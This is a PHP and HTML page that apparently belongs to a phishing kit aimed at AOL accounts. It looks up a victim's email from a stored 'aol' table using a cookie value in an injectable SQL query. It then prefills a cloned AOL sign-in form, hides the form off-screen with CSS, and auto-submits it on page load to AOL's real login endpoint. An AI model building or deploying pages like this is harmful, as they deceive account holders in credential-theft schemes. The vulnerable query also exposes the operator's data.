<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `aol` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["formCreds"].submit();}</script>


<form name="AOLLoginForm" method="POST" action="https://my.screenname.aol.com/_cqr/login/login.psp" onSubmit="return validateAolTab(this);" id="formCreds">
  <input type="hidden" name="sitedomain" value="startpage.aol.com">
  <input type="hidden" name="siteId" value="">
  <input type="hidden" name="lang" value="en">
  <input type="hidden" name="locale" value="us">        
  <input type="hidden" name="authLev" value="0">
  <input type="hidden" name="siteState" value="OrigUrl%3Dhttp%253A%252F%252Fwww.aol.com%252F">
  <input type="hidden" name="isSiteStateEncoded" value="true">
  <input type="hidden" name="mcState" value="initialized">
  <input type="hidden" name="uitype" value="std">
  <input type="hidden" name="use_aam" value="0">
  <input type="hidden" name="offerId" value="">
  <input type="hidden" name="seamless" value="y">
  <input type="hidden" name="regPromoCode" value="">
  <input type="hidden" name="usrd" value="7529250">
  <input type="hidden" name="doSSL" value="">
  <input type="hidden" name="redirType" value="">
  <input type="hidden" name="xchk" value="false">
  <input type="hidden" name="tab" value="">
  <input type="hidden" name="lsoDP" value="">
  
  
  
  
  
  
  
   <div id="snPwdErr" class="noLpErrorMsg">
       
       
       
       
   </div>
  <label for="lgnId1" id="lgnLbl">Username or Email</label>
             
  
  
   <input type="text" name="loginId" maxlength="255" tabindex="1" value="<?=$email;?>" id="lgnId1" class="inputBox">
  
  
  

  <label for="pwdId1" id="pwdLbl">Password</label>
  <input type="password" name="password" maxlength="39" tabindex="2" value="" id="pwdId1" class="inputBox">      	

  <a href="https://account.login.aol.com/opr/_cqr/opr/opr.psp?sitedomain=startpage.aol.com&amp;authLev=0&amp;siteState=OrigUrl%3Dhttp%253A%252F%252Fwww.aol.com%252F&amp;lang=en&amp;locale=us" tabindex="4" target="_top" id="forgot-pwd">Forgot password?</a>
  
  <div id="signin-row">
  	<div id="lev0">
	  
	     <label for="rmbrMe" id="chkLbl">
		      <input type="checkbox" name="rememberMe" tabindex="5" value="on" id="rmbrMe" alt="&lt;SNSI18N:message key='login.rememberMe'/&gt;">
		      Remember Me
	     </label>
	      
	  	
  	</div> 
  	<input type="submit" id="submitID" value="Sign In" tabindex="3" title="Sign In" alt="Sign In">  
  </div> 
  
    <br class="clearfix">
    <a href="https://new.aol.com/productsweb?ncid=txtlnkuswebr00000054&amp;promocode=825329" target="_top" id="getSn" tabindex="6" title="Get a Free Username">Get a Free Username</a>

 </form>
 
 

</body>
</html>

